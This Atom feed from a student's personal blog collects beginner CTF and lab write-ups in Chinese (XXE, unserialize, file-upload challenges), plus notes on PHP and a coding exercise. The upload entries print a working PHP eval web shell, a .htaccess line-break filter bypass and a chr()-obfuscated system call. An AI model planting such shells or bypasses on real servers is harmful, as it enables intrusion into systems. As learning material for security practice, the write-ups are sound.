<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://crlrlc.github.io/</id>
    <title>Gridea</title>
    <updated>2020-11-25T11:55:51.614Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://crlrlc.github.io/"/>
    <link rel="self" href="https://crlrlc.github.io/atom.xml"/>
    <subtitle>温故而知新</subtitle>
    <logo>https://crlrlc.github.io/images/avatar.png</logo>
    <icon>https://crlrlc.github.io/favicon.ico</icon>
    <rights>All rights reserved 2020, Gridea</rights>
    <entry>
        <title type="html"><![CDATA[神奇的登录框]]></title>
        <id>https://crlrlc.github.io/post/shen-qi-de-deng-lu-kuang/</id>
        <link href="https://crlrlc.github.io/post/shen-qi-de-deng-lu-kuang/">
        </link>
        <updated>2020-11-25T11:37:56.000Z</updated>
        <content type="html"><![CDATA[<p>1、打开题目，得到一个登录窗<br>
<img src="https://crlrlc.github.io//post-images/1606304463434.png" alt="" loading="lazy"><br>
2、把一个神奇的指令输进去并按下查询键：<br>
<img src="https://crlrlc.github.io//post-images/1606304577387.png" alt="" loading="lazy"><br>
3、可以发现页面并没有发生变化，但是我们在网址上输一个1.txt进去：<br>
<img src="https://crlrlc.github.io//post-images/1606304836043.png" alt="" loading="lazy"><br>
4、接下来返回到登录窗，输入一个指令并点击查询，如图所示：<br>
<img src="https://crlrlc.github.io//post-images/1606305133537.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1606305184429.png" alt="" loading="lazy"><br>
5、可以发现页面虽然并没有什么变化，不过和刚刚一样，在网址栏输入/2.txt，就可以得到flag了：<br>
<img src="https://crlrlc.github.io//post-images/1606305311522.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Who are you?]]></title>
        <id>https://crlrlc.github.io/post/who-are-you/</id>
        <link href="https://crlrlc.github.io/post/who-are-you/">
        </link>
        <updated>2020-11-25T11:21:57.000Z</updated>
        <content type="html"><![CDATA[<p>1、打开题目发现这个玩意：<br>
<img src="https://crlrlc.github.io//post-images/1606303752487.png" alt="" loading="lazy"><br>
2、打开burpsuit并把得到的东西发到重发器上并加上xxe：<br>
<img src="https://crlrlc.github.io//post-images/1606303852167.png" alt="" loading="lazy"><br>
3、发送后得到这个东西：<br>
<img src="https://crlrlc.github.io//post-images/1606303963668.png" alt="" loading="lazy"><br>
4、再把得到的一大串字母copy到解码器上用bese64解码一下得到flag：<br>
<img src="https://crlrlc.github.io//post-images/1606304117036.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[G2mtu学生?]]></title>
        <id>https://crlrlc.github.io/post/g2mtu-xue-sheng/</id>
        <link href="https://crlrlc.github.io/post/g2mtu-xue-sheng/">
        </link>
        <updated>2020-11-25T10:34:15.000Z</updated>
        <content type="html"><![CDATA[<p>1、打开题目，发现这样一个东西：<br>
<img src="https://crlrlc.github.io//post-images/1606300573295.png" alt="" loading="lazy"><br>
2、打开burpsuit发现这样的东西<br>
<img src="https://crlrlc.github.io//post-images/1606300665780.png" alt="" loading="lazy"><br>
3、把拦截的东西发到重发器上：<br>
<img src="https://crlrlc.github.io//post-images/1606300868908.png" alt="" loading="lazy"><br>
4、最终得到flag文件：<br>
<img src="https://crlrlc.github.io//post-images/1606300943423.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[力口做题]]></title>
        <id>https://crlrlc.github.io/post/li-kou-zuo-ti/</id>
        <link href="https://crlrlc.github.io/post/li-kou-zuo-ti/">
        </link>
        <updated>2020-11-20T15:15:26.000Z</updated>
        <content type="html"><![CDATA[<p>题目如下：<br>
<img src="https://crlrlc.github.io//post-images/1605885416449.png" alt="" loading="lazy"><br>
结果：<br>
太菜了，做不出来，只能看答案😰<br>
答案如下：<br>
<img src="https://crlrlc.github.io//post-images/1605885468484.png" alt="" loading="lazy"><br>
心得：<br>
整体思路：创建一个新的动态数组与原数组相对应，并利用if的结构为手段来把空格字符代替成%20来达到目的<br>
答案的流程：<br>
1、创建动态数组；<br>
2、将新数组与原数组相对应，并把‘ ’代替成%20，这就是新数组的长度是原数组的3倍的原因。因为字符数组最后有\0,所以length*3再+1.</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[unserialize4]]></title>
        <id>https://crlrlc.github.io/post/unserialize4/</id>
        <link href="https://crlrlc.github.io/post/unserialize4/">
        </link>
        <updated>2020-11-08T03:26:54.000Z</updated>
        <content type="html"><![CDATA[<p>##写在前面：<br>
又是在大佬的帮助下，我又学会了一道题😂，突然发现所有的靶没有一个是我自己独立解决的😂，下面是步骤<br>
##过程：<br>
<img src="https://crlrlc.github.io//post-images/1604806928412.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1604806935375.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1604806941149.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1604806947382.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1604806951798.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[第四次打靶]]></title>
        <id>https://crlrlc.github.io/post/di-si-ci-da-ba/</id>
        <link href="https://crlrlc.github.io/post/di-si-ci-da-ba/">
        </link>
        <updated>2020-10-31T15:05:26.000Z</updated>
        <content type="html"><![CDATA[<p>##在师兄的指导下，我进行了底四次靶场实验下面是步骤<br>
<img src="https://crlrlc.github.io//post-images/1604156810423.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1604156815676.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1604156820417.png" alt="" loading="lazy"><br>
##补充<br>
upload3那题我失败了，原因是.htaccess没有双写，只是双写了1.aaa中的木马，<br>
<img src="https://crlrlc.github.io//post-images/1604157027025.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1604157109287.png" alt="" loading="lazy"><br>
此外，我还知道了一个不用蚁剑的办法：<br>
1.aaa<br>
可以是<br>
&lt;?pphphp<br>
echo <code>cat /flag</code>;</p>
<pre><code>也可以是
&lt;  ?pphphp
$a = chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);
$a('cat /flag');

这两个方法就直接访问就行了，不需要用蚁剑   </code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[3,upload6]]></title>
        <id>https://crlrlc.github.io/post/3upload6/</id>
        <link href="https://crlrlc.github.io/post/3upload6/">
        </link>
        <updated>2020-10-29T09:30:36.000Z</updated>
        <content type="html"><![CDATA[<h3 id="htaccess文件换行绕过">.htaccess文件换行绕过</h3>
<p>上传.htaccess文件时候发现文件内容被过滤。可以使用换行绕过的方法绕过过滤。</p>
<p>.htaccess支持换行编写所以使用换行可以直接上传成功并解析。</p>
<ul>
<li>题目</li>
</ul>
<p>upload6</p>
<ul>
<li>
<p>过滤掉application，则使用换行绕过</p>
</li>
<li>
<p>.htaccess</p>
</li>
</ul>
<pre><code>AddType application/x-httpd-php .aaa
</code></pre>
<p>提示：内容不能有application</p>
<p>尝试使用.htaccess文件换行绕过。</p>
<ul>
<li>.htaccess</li>
</ul>
<pre><code>AddType appli\
cation/x-httpd-php .aaa
</code></pre>
<ul>
<li>1.aaa</li>
</ul>
<pre><code>&lt;?php
@eval($_POST['cmd']);
</code></pre>
<p>##步骤如下：<br>
<img src="https://crlrlc.github.io//post-images/1603964256264.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1603964263023.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1603964269523.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1603964275363.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[第二次打靶]]></title>
        <id>https://crlrlc.github.io/post/di-er-ci-da-ba/</id>
        <link href="https://crlrlc.github.io/post/di-er-ci-da-ba/">
        </link>
        <updated>2020-10-26T13:31:36.000Z</updated>
        <content type="html"><![CDATA[<p>##第二次做题<br>
第一次用蚁剑，下面是步骤<br>
<img src="https://crlrlc.github.io//post-images/1603719175276.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1603719181951.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1603719185745.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1603719199605.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1603719204827.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1603719209974.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1603719213950.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1603719217939.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1603719223555.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[第一次打靶]]></title>
        <id>https://crlrlc.github.io/post/di-yi-ci-da-ba/</id>
        <link href="https://crlrlc.github.io/post/di-yi-ci-da-ba/">
        </link>
        <updated>2020-10-25T01:51:53.000Z</updated>
        <content type="html"><![CDATA[<p>##目的<br>
按照流程把做题过程复述，感受做信息安全比赛的题目<br>
##第一步<br>
<img src="https://crlrlc.github.io//post-images/1603590913267.png" alt="" loading="lazy"><br>
##第二步<br>
<img src="https://crlrlc.github.io//post-images/1603590984113.png" alt="" loading="lazy"><br>
##第三步<br>
<img src="https://crlrlc.github.io//post-images/1603591026640.png" alt="" loading="lazy"><br>
##第四步<br>
<img src="https://crlrlc.github.io//post-images/1603591050797.png" alt="" loading="lazy"><br>
##第五步<br>
<img src="https://crlrlc.github.io//post-images/1603591277515.png" alt="" loading="lazy"><br>
##补充<br>
在第四部中，我们会好奇为什么域名后面要加‘?a=’，那是因为<br>
<img src="https://crlrlc.github.io//post-images/1603591262399.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[php的更新]]></title>
        <id>https://crlrlc.github.io/post/php-de-geng-xin/</id>
        <link href="https://crlrlc.github.io/post/php-de-geng-xin/">
        </link>
        <updated>2020-10-20T14:25:02.000Z</updated>
        <content type="html"><![CDATA[<p>##写在前面<br>
php是一个脚本语言，脚本语言就是不用编译器编译就可以执行的语言。<br>
在前面我用PHPstudy遇到了一些问题，于是<br>
我换了PHP的集成环境，<br>
<img src="https://crlrlc.github.io//post-images/1603204035702.png" alt="" loading="lazy"><br>
<img src="https://crlrlc.github.io//post-images/1603204110700.png" alt="" loading="lazy"><br>
并且成功转换了代码<br>
<img src="https://crlrlc.github.io//post-images/1603204501835.png" alt="" loading="lazy"><br>
并发现一些问题<br>
##第一<br>
localhost访问的是<br>
<img src="https://crlrlc.github.io//post-images/1603204683840.png" alt="" loading="lazy"><br>
##第二<br>
index这个名字似乎有神奇的魔力让网页优先访问它<br>
<img src="https://crlrlc.github.io//post-images/1603205016480.png" alt="" loading="lazy"><br>
##第三<br>
在后缀为HTML和PHP是PHP优先<br>
<img src="https://crlrlc.github.io//post-images/1603205062037.png" alt="" loading="lazy"><br>
##第四<br>
虽然在PHP中，变量不用提前声明，但是前面一定要加美元符$$,就像这样<br>
<img src="https://crlrlc.github.io//post-images/1603206195963.png" alt="" loading="lazy"><br>
##第五<br>
php里的应用类似于c中的指针<br>
同样作用的程序php是这样的<br>
<img src="https://crlrlc.github.io//post-images/1603286147837.png" alt="" loading="lazy"><br>
而在c中是这样的<br>
<img src="https://crlrlc.github.io//post-images/1603286259217.png" alt="" loading="lazy"><br>
在php中和c的i=%d不同的是，php要是<span class='katex-error' title='ParseError: KaTeX parse error: Expected &#039;}&#039;, got &#039;EOF&#039; at end of input: i={'>i={</span>i}的话会变成2=2（假设在这之前<span class='katex-error' title='ParseError: KaTeX parse error: Can&#039;t use function &#039;\&#039;&#039; in math mode at position 29: …c同样的效果，必须加转义字符&#039;\̲&#039;̲  &#039;\$i={'>i=2）要想使php输出与c同样的效果，必须加转义字符&#039;\&#039;  &#039;\$i={</span>i}'<br>
##最后<br>
目前发现for循环while循环还有if的用法和c语言一样，但是换行符变成了这样&quot;<br>&quot;<br>
自增自减要这样$i++;其他似乎和c语言一样。未完待续。</p>
]]></content>
    </entry>
</feed>